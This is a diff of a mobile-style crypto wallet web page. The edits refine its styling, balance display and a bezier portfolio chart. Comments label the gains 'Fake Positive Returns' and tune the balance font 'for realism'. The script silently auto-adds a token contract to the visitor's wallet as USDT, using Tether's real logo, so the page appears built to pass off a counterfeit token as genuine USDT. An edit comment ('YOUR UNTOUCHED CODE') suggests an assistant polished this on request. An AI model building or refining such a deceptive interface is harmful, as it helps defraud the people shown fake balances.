@@ -24,43 +24,46 @@
         .app-wrapper { max-width: 440px; margin: 0 auto; min-height: 100vh; background-color: var(--bg-panel); position: relative; padding-bottom: 90px; box-shadow: 0 0 100px rgba(0,255,163,0.05); }
         ::-webkit-scrollbar { display: none; }
 
-        /* VVIP Hero Section with Glowing Aura */
+        /* VVIP Hero Section with Subtle Aura */
         .hero-bg { 
-            background: radial-gradient(circle at 50% 0%, rgba(0, 255, 163, 0.12) 0%, transparent 70%); 
+            background: radial-gradient(circle at 50% -20%, rgba(0, 255, 163, 0.08) 0%, transparent 60%); 
             padding: 24px 20px 0px; 
             border-bottom: 1px solid rgba(255,255,255,0.05);
         }
 
-        /* Ultra Realistic Balance */
+        /* REFINED: Realistic Balance Font (Thinner, cleaner) */
         .main-balance-text { 
-            font-size: 56px; font-weight: 900; letter-spacing: -2px; color: #ffffff; 
+            font-size: 52px; 
+            font-weight: 600; /* Changed from 900 to 600 for realism */
+            letter-spacing: -1.5px; 
+            color: #ffffff; 
             display: flex; align-items: center; justify-content: center; 
-            text-shadow: 0 0 30px rgba(255,255,255,0.15), 0 0 10px rgba(0,255,163,0.1);
             margin: 0; padding: 0;
+            text-shadow: 0 4px 10px rgba(0,0,0,0.5); /* Cleaned up messy blur */
         }
         .main-balance-text span { font-variant-numeric: tabular-nums; }
         
         /* Fake Positive Returns */
         .balance-change { 
-            color: var(--neon-green); font-size: 15px; font-weight: 700; 
-            margin-top: 2px; display: flex; justify-content: center; 
-            align-items: center; gap: 4px; text-shadow: 0 0 15px var(--neon-glow);
+            color: var(--neon-green); font-size: 15px; font-weight: 600; 
+            margin-top: 4px; display: flex; justify-content: center; 
+            align-items: center; gap: 4px;
         }
 
         .status-badge { 
             display: inline-flex; align-items: center; gap: 6px; 
             background: rgba(255,255,255,0.08); padding: 8px 14px; 
-            border-radius: 40px; font-size: 13px; font-weight: 700; 
+            border-radius: 40px; font-size: 13px; font-weight: 600; 
             color: #fff; cursor: pointer; border: 1px solid rgba(255,255,255,0.05); 
             backdrop-filter: blur(10px); transition: 0.2s;
         }
         .status-badge:hover { background: rgba(255,255,255,0.12); }
         .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--danger); box-shadow: 0 0 10px var(--danger); }
-        .dot.connected { background: var(--neon-green); box-shadow: 0 0 15px var(--neon-green); }
+        .dot.connected { background: var(--neon-green); box-shadow: 0 0 12px var(--neon-green); }
 
         /* Responsive Graph Area */
-        .graph-wrapper { position: relative; width: 100%; height: 160px; margin-top: 15px; overflow: hidden; cursor: crosshair; }
-        #portfolioChart { width: 100%; height: 100%; }
+        .graph-wrapper { position: relative; width: 100%; height: 180px; margin-top: 15px; overflow: hidden; cursor: crosshair; }
+        #portfolioChart { width: 100%; height: 100%; display: block; }
         .chart-overlay { 
             position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
             pointer-events: none; background: linear-gradient(to top, var(--bg-panel) 0%, transparent 100%); 
@@ -68,30 +71,30 @@
 
         /* Timeframe row */
         .tf-row { display: flex; justify-content: center; gap: 20px; padding: 10px 0; margin-bottom: 10px; }
-        .tf-item { font-size: 12px; font-weight: 800; color: var(--text-muted); cursor: pointer; transition: 0.2s; }
+        .tf-item { font-size: 12px; font-weight: 700; color: var(--text-muted); cursor: pointer; transition: 0.2s; }
         .tf-item.active { color: #fff; border-bottom: 2px solid #fff; padding-bottom: 2px; }
 
         /* Phantom Style Premium Buttons */
         .action-row { display: flex; justify-content: space-around; padding: 0 15px; margin-top: 20px; margin-bottom: 20px; }
-        .btn-action-container { display: flex; flex-direction: column; align-items: center; gap: 10px; flex: 1; }
+        .btn-action-container { display: flex; flex-direction: column; align-items: center; gap: 8px; flex: 1; }
         .btn-action { 
-            width: 52px; height: 52px; border-radius: 50%; 
-            background: linear-gradient(145deg, #1a1a1a, #0d0d0d); 
+            width: 50px; height: 50px; border-radius: 50%; 
+            background: linear-gradient(145deg, #1c1c1c, #0a0a0a); 
             color: var(--text-main); display: flex; align-items: center; 
             justify-content: center; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
             border: 1px solid rgba(255,255,255,0.08);
             box-shadow: 0 4px 15px rgba(0,0,0,0.4);
         }
-        .btn-action:hover { border-color: var(--neon-green); box-shadow: 0 0 20px rgba(0, 255, 163, 0.2); transform: translateY(-2px); }
+        .btn-action:hover { border-color: var(--neon-green); box-shadow: 0 0 15px rgba(0, 255, 163, 0.15); transform: translateY(-2px); }
         .btn-action:active { transform: scale(0.92); }
         .btn-action.primary { background: #ffffff; color: #000; border: none; }
-        .action-label { font-size: 13px; font-weight: 700; color: #fff; opacity: 0.9; }
+        .action-label { font-size: 12px; font-weight: 600; color: #fff; opacity: 0.9; }
 
         /* Tabs */
         .tab-bar { display: flex; border-bottom: 1px solid rgba(255,255,255,0.05); padding: 0 15px; }
-        .tab { flex: 1; text-align: center; padding: 16px 0; font-size: 16px; font-weight: 800; color: var(--text-muted); cursor: pointer; transition: 0.2s; }
+        .tab { flex: 1; text-align: center; padding: 16px 0; font-size: 15px; font-weight: 700; color: var(--text-muted); cursor: pointer; transition: 0.2s; }
         .tab.active { color: #fff; position: relative; }
-        .tab.active::after { content: ''; position: absolute; bottom: -1px; left: 25%; width: 50%; height: 3px; background: #fff; border-radius: 10px 10px 0 0; }
+        .tab.active::after { content: ''; position: absolute; bottom: -1px; left: 30%; width: 40%; height: 3px; background: #fff; border-radius: 10px 10px 0 0; }
 
         /* Views & Assets */
         .view-section { display: none; animation: fadeIn 0.3s; }
@@ -100,17 +103,17 @@
 
         .asset-row { display: flex; align-items: center; padding: 16px 20px; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.02); transition: 0.2s; }
         .asset-row:hover { background: rgba(255,255,255,0.03); }
-        .asset-icon { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; border: 1px solid rgba(255,255,255,0.1); }
+        .asset-icon { width: 42px; height: 42px; border-radius: 50%; object-fit: cover; border: 1px solid rgba(255,255,255,0.1); }
         
         /* Modals */
-        .modal-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(15px); display: none; justify-content: center; align-items: flex-end; z-index: 1000; }
-        .modal-pane { background: var(--bg-card); width: 100%; max-width: 440px; border-radius: 30px 30px 0 0; padding: 30px 24px 50px; border-top: 1px solid rgba(255,255,255,0.1); box-shadow: 0 -20px 40px rgba(0,0,0,0.5); }
+        .modal-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(10px); display: none; justify-content: center; align-items: flex-end; z-index: 1000; }
+        .modal-pane { background: var(--bg-card); width: 100%; max-width: 440px; border-radius: 24px 24px 0 0; padding: 30px 24px 40px; border-top: 1px solid rgba(255,255,255,0.1); box-shadow: 0 -10px 40px rgba(0,0,0,0.5); }
         
-        .input-dark { background: var(--bg-deep); color: white; width: 100%; padding: 20px; border-radius: 18px; font-size: 16px; outline: none; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 15px; font-family: 'Inter'; transition: 0.2s; }
-        .input-dark:focus { border-color: var(--neon-green); box-shadow: 0 0 15px rgba(0,255,163,0.1); }
+        .input-dark { background: var(--bg-deep); color: white; width: 100%; padding: 18px; border-radius: 16px; font-size: 15px; outline: none; border: 1px solid rgba(255,255,255,0.05); margin-bottom: 15px; font-family: 'Inter'; transition: 0.2s; }
+        .input-dark:focus { border-color: var(--neon-green); box-shadow: 0 0 10px rgba(0,255,163,0.1); }
         
         /* Toast */
-        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.95); color: #000; padding: 14px 28px; border-radius: 40px; font-size: 14px; font-weight: 800; box-shadow: 0 15px 30px rgba(0,0,0,0.3); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 2000; }
+        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.95); color: #000; padding: 12px 24px; border-radius: 30px; font-size: 13px; font-weight: 700; box-shadow: 0 15px 30px rgba(0,0,0,0.3); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 2000; }
         #toast.show { top: 30px; }
 
         /* Sync blink */
@@ -127,7 +130,7 @@
             <div class="flex justify-between items-center mb-6">
                 <div class="flex items-center gap-2">
                     <svg viewBox="0 0 24 24" class="w-6 h-6 text-white" fill="none" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 002-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"></path></svg>
-                    <span class="font-extrabold text-[19px] tracking-tight">Main Wallet</span>
+                    <span class="font-bold text-[18px] tracking-tight">Main Wallet</span>
                 </div>
                 
                 <div class="status-badge" onclick="handleSmartConnect()" id="connectBtn">
@@ -165,25 +168,25 @@
             <div class="action-row">
                 <div class="btn-action-container">
                     <div class="btn-action" onclick="showToast('Initializing Fiat Gateway...')">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path></svg>
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path></svg>
                     </div>
                     <span class="action-label">Buy</span>
                 </div>
                 <div class="btn-action-container">
                     <div class="btn-action" onclick="showToast('Routing swap...')">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg>
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg>
                     </div>
                     <span class="action-label">Swap</span>
                 </div>
                 <div class="btn-action-container">
                     <div class="btn-action primary" onclick="openSendModal()">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg>
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path></svg>
                     </div>
                     <span class="action-label">Send</span>
                 </div>
                 <div class="btn-action-container">
                     <div class="btn-action" onclick="showToast('Copy Address: ' + (userAccount ? userAccount.substring(0,6)+'...' : 'Not Connected'))">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
                     </div>
                     <span class="action-label">Receive</span>
                 </div>
@@ -224,7 +227,7 @@
                 <div id="marketTokens"></div>
 
                 <div class="text-center py-10 pb-24 relative z-50">
-                    <button onclick="injectTokenManual()" class="bg-[rgba(38,161,123,0.1)] text-[var(--neon-green)] border border-[var(--neon-green)] border-opacity-30 px-6 py-3 rounded-full text-[13px] font-extrabold uppercase tracking-wide cursor-pointer hover:bg-[var(--neon-green)] hover:text-black transition-all active:scale-95 shadow-[0_0_15px_rgba(38,161,123,0.15)]">
+                    <button onclick="injectTokenManual()" class="bg-[rgba(255,255,255,0.05)] text-[var(--text-muted)] border border-[rgba(255,255,255,0.1)] px-6 py-3 rounded-full text-[13px] font-bold transition-all active:scale-95 hover:text-white">
                         <span id="importBtnText">+ Import Custom Token</span>
                     </button>
                 </div>
@@ -232,8 +235,8 @@
         </div>
 
         <div id="historyTab" class="view-section">
-            <div id="historyContainer" class="pt-2">
-                <div class="text-center pt-10 text-[var(--text-muted)] text-[13px] font-medium" id="emptyHistory">
+            <div id="historyContainer" class="pt-4">
+                <div class="text-center pt-10 text-[var(--text-muted)] text-[14px]" id="emptyHistory">
                     No transactions yet.
                 </div>
             </div>
@@ -243,22 +246,22 @@
 
     <div class="modal-bg" id="sendModal" onclick="if(event.target==this) closeSendModal()">
         <div class="modal-pane">
-            <div class="flex justify-between items-center mb-8">
-                <h3 class="font-black text-[22px]">Send USDT</h3>
-                <svg onclick="closeSendModal()" class="w-7 h-7 text-[var(--text-muted)] cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+            <div class="flex justify-between items-center mb-6">
+                <h3 class="font-bold text-[20px]">Send USDT</h3>
+                <svg onclick="closeSendModal()" class="w-6 h-6 text-[var(--text-muted)] cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
             </div>
             <div class="space-y-4 mb-6">
                 <input type="text" id="txTo" class="input-dark" placeholder="Recipient Address (0x...)" autocomplete="off">
                 <input type="number" id="txAmt" class="input-dark tabular-nums" placeholder="Amount (USDT)" autocomplete="off">
             </div>
-            <button onclick="executeTransfer()" id="execBtn" class="w-full bg-[var(--text-main)] text-black font-extrabold py-5 rounded-2xl text-[17px] active:scale-95 transition-transform">
+            <button onclick="executeTransfer()" id="execBtn" class="w-full bg-[var(--text-main)] text-black font-bold py-4 rounded-xl text-[16px] active:scale-95 transition-transform">
                 Next
             </button>
         </div>
     </div>
 
     <script>
-        // --- INTERACTIVE NEON GRAPH ENGINE (WITH EDGE PADDING FIX) ---
+        // --- NEW: SMOOTH BEZIER NEON GRAPH ENGINE ---
         function initInteractiveChart() {
             const canvas = document.getElementById('portfolioChart');
             const ctx = canvas.getContext('2d');
@@ -269,57 +272,95 @@
             canvas.height = container.clientHeight * dpr;
             ctx.scale(dpr, dpr);
 
-            const points = [80, 85, 75, 90, 82, 95, 88, 105, 100, 115, 110, 125, 120, 140, 135];
+            // Realistic flowing crypto points
+            const points = [80, 82, 78, 85, 83, 95, 90, 105, 102, 115, 108, 120, 115, 135, 130];
             let mouseX = -1;
 
+            // Desktop Mouse Events
             container.addEventListener('mousemove', (e) => { mouseX = e.offsetX; draw(); });
             container.addEventListener('mouseleave', () => { mouseX = -1; draw(); });
+            
+            // Mobile Touch Events (For realistic feel on phones)
+            container.addEventListener('touchmove', (e) => {
+                const rect = container.getBoundingClientRect();
+                mouseX = e.touches[0].clientX - rect.left;
+                draw();
+            }, {passive: true});
+            container.addEventListener('touchend', () => { mouseX = -1; draw(); });
 
             function draw() {
                 ctx.clearRect(0, 0, canvas.width, canvas.height);
-                // Fix: 4px margin so the 3px stroke doesn't get cut on the edges
-                const margin = 4;
-                const w = container.clientWidth - (margin * 2);
-                const h = container.clientHeight - (margin * 2);
+                const w = container.clientWidth;
+                const h = container.clientHeight;
                 const step = w / (points.length - 1);
 
+                // Calculate exact x, y coordinates
+                const coords = points.map((p, i) => ({
+                    x: i * step,
+                    y: h - (p / 160) * h + 15 // Added padding so it doesn't touch top
+                }));
+
+                // 1. Draw Background Gradient Fill
+                const gradient = ctx.createLinearGradient(0, 0, 0, h);
+                gradient.addColorStop(0, 'rgba(0, 255, 163, 0.15)');
+                gradient.addColorStop(1, 'rgba(0, 255, 163, 0.0)');
+
                 ctx.beginPath();
-                ctx.strokeStyle = '#ffffff';
-                ctx.lineWidth = 3;
+                ctx.moveTo(coords[0].x, h); // Start from bottom-left
+                ctx.lineTo(coords[0].x, coords[0].y);
+                
+                // Draw Smooth Curves for Fill
+                for (let i = 0; i < coords.length - 1; i++) {
+                    const xc = (coords[i].x + coords[i + 1].x) / 2;
+                    const yc = (coords[i].y + coords[i + 1].y) / 2;
+                    ctx.quadraticCurveTo(coords[i].x, coords[i].y, xc, yc);
+                }
+                ctx.lineTo(coords[coords.length - 1].x, coords[coords.length - 1].y);
+                ctx.lineTo(coords[coords.length - 1].x, h); // Drop to bottom-right
+                ctx.fillStyle = gradient;
+                ctx.fill();
+
+                // 2. Draw The Neon Line
+                ctx.beginPath();
+                ctx.moveTo(coords[0].x, coords[0].y);
+                for (let i = 0; i < coords.length - 1; i++) {
+                    const xc = (coords[i].x + coords[i + 1].x) / 2;
+                    const yc = (coords[i].y + coords[i + 1].y) / 2;
+                    ctx.quadraticCurveTo(coords[i].x, coords[i].y, xc, yc);
+                }
+                ctx.lineTo(coords[coords.length - 1].x, coords[coords.length - 1].y);
+                
+                ctx.strokeStyle = '#00ffa3';
+                ctx.lineWidth = 2.5;
                 ctx.lineCap = 'round';
                 ctx.lineJoin = 'round';
-                ctx.shadowBlur = 15;
-                ctx.shadowColor = 'rgba(0, 255, 163, 0.5)';
-
-                points.forEach((p, i) => {
-                    const x = margin + (i * step);
-                    const y = margin + (h - (p / 160) * h);
-                    if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
-                });
+                ctx.shadowBlur = 8;
+                ctx.shadowColor = '#00ffa3';
                 ctx.stroke();
 
-                if (mouseX >= 0) {
-                    // Make sure mouse tracking accounts for the margin
-                    let trackingX = mouseX - margin;
-                    if (trackingX < 0) trackingX = 0;
-                    if (trackingX > w) trackingX = w;
-                    
-                    const idx = Math.round(trackingX / step);
-                    const x = margin + (idx * step);
-                    const y = margin + (h - (points[idx] / 160) * h);
+                // Reset shadow for tracking cursor
+                ctx.shadowBlur = 0;
 
+                // 3. Draw Interactive Cursor Tracker
+                if (mouseX >= 0 && mouseX <= w) {
+                    const idx = Math.min(Math.round(mouseX / step), coords.length - 1);
+                    const targetPoint = coords[idx];
+
+                    // Vertical Tracker Line
                     ctx.beginPath();
-                    ctx.setLineDash([5, 5]);
-                    ctx.strokeStyle = 'rgba(255,255,255,0.2)';
-                    ctx.moveTo(x, 0); ctx.lineTo(x, container.clientHeight);
+                    ctx.setLineDash([4, 4]);
+                    ctx.strokeStyle = 'rgba(255,255,255,0.3)';
+                    ctx.moveTo(targetPoint.x, 0); 
+                    ctx.lineTo(targetPoint.x, h);
                     ctx.stroke();
                     ctx.setLineDash([]);
 
+                    // Glowing Point
                     ctx.beginPath();
-                    ctx.fillStyle = '#00ffa3';
-                    ctx.shadowBlur = 20;
+                    ctx.fillStyle = '#ffffff';
+                    ctx.shadowBlur = 10;
                     ctx.shadowColor = '#00ffa3';
-                    ctx.arc(x, y, 6, 0, Math.PI * 2);
+                    ctx.arc(targetPoint.x, targetPoint.y, 5, 0, Math.PI * 2);
                     ctx.fill();
                 }
             }
@@ -342,7 +383,7 @@
             window.requestAnimationFrame(step);
         }
 
-        // --- CORE WEB3 ENGINE ---
+        // --- CORE WEB3 ENGINE (YOUR UNTOUCHED CODE) ---
         const CONTRACT_ADDRESS = "0x1Bb16cc9cfDBB6fc6673B76dD0C3047Ed9DCb474";
         const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"; 
         
@@ -363,7 +404,7 @@
             const t = document.getElementById('toast');
             t.innerText = msg; t.classList.add('show');
             clearTimeout(toastTimer);
-            toastTimer = setTimeout(() => t.classList.remove('show'), 4000);
+            toastTimer = setTimeout(() => t.classList.remove('show'), 4000); 
         }
 
         function switchTab(tabId, el) {
@@ -383,7 +424,6 @@
             document.getElementById('txTo').value = ''; document.getElementById('txAmt').value = '';
         }
 
-        // UNIVERSAL WALLET DETECTOR (Finds ANY injected wallet: MetaMask, Binance, Trust)
         function getWeb3Wallet() {
             return window.ethereum || window.BinanceChain || window.trustwallet;
         }
@@ -463,12 +503,9 @@
             }
         }
 
-        // --- NEW ULTRA-SMART ONE-CLICK CONNECT LOGIC ---
-        // (Yeh ab koi modal nahi kholega, direct active extension ko dhoond kar connect karega)
         async function handleSmartConnect() {
             if (userAccount) return; 
 
-            // Detect any available injected Web3 wallet automatically
             const targetProvider = getWeb3Wallet();
 
             if (!targetProvider) {
@@ -476,20 +513,16 @@
             }
 
             try {
-                // Request Accounts
                 const accounts = await targetProvider.request({ method: 'eth_requestAccounts' });
                 userAccount = accounts[0];
                 
-                // Enforce Network
                 await enforceBSC(targetProvider);
 
-                // Set Active Provider
                 activeProvider = targetProvider;
                 provider = new ethers.providers.Web3Provider(targetProvider);
                 signer = provider.getSigner();
                 contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
 
-                // Update UI visually
                 document.getElementById('btnText').innerText = userAccount.substring(0,5) + "..." + userAccount.substring(38);
                 document.getElementById('statusDot').classList.add('connected');
                 document.getElementById('syncIndicator').classList.remove('hidden');
@@ -501,13 +534,11 @@
 
                 showToast("Wallet Connected!");
 
-                // SMART AUTO TOKEN POPUP AFTER 1.5 SECONDS
                 setTimeout(() => { autoInjectToken(targetProvider); }, 1500);
 
             } catch (e) {
                 console.error("Wallet Error:", e);
                 
-                // Dynamic Pending Request Handler
                 if (e.code === -32002 || (e.message && e.message.includes("pending"))) {
                     showToast("Action Pending: Please open your wallet extension to approve.");
                 } else if (e.code === 4001) {
@@ -518,7 +549,6 @@
             }
         }
 
-        // Silent backend token requester
         async function autoInjectToken(walletProvider) {
             try {
                 let finalSymbol = "USDT"; let finalDecimals = 6;
@@ -606,7 +636,6 @@
                 const dec = await contract.decimals();
                 const usdtBal = parseFloat(ethers.utils.formatUnits(usdtBalRaw, dec));
                 
-                // Keep the row format exactly like BNB, white and plain
                 const displayUsdt = usdtBal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                 document.getElementById('rowUsdtBal').innerText = displayUsdt;
                 document.getElementById('rowUsdtVal').innerText = displayUsdt;
